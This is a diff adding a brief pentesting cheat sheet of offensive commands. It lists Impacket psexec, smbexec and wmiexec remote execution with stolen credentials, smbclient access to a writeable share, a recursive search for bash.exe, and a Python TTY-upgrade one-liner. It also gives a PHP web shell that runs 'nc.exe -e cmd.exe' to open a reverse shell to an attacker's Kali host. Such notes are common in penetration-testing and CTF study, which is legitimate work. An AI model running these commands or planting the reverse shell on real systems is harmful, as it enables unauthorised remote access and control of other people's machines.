@@ -1,0 +1,33 @@
+
+Some Commands : 
+
+1. psexec.py <username>:<password>@<hostIP_address>
+   smbexec.py <username>:<password>@<hostIP_address>
+   wmiexec.py <username>:<password>@<hostIP_address>    
+
+2. smbclient \\\\<ip_address>\\<writeable-share> -U <username>
+
+3. php file which use netcat to connect back to our host : 
+
+  <?php   
+    system('nc.exe -e cmd.exe <kali_linux_ip> <port_number>')
+  ?>
+ 
+4. C:\users\AnshPC > where /R c:\windows bash.exe 
+	this command search for bash.exe recursively in windows directory 
+
+5. python -c "import pty;pty.spawn('/bin/bash')" 
+	To spawn a tty shell 
+
+6. search for tty cheatsheat 
+
+tty is sort of teletype, but popularily known as a terminal it allows you to interact with the system by passing on the data to the system, and displaying the output produced by the system.
+
+
+
+
+
+
+
+
+
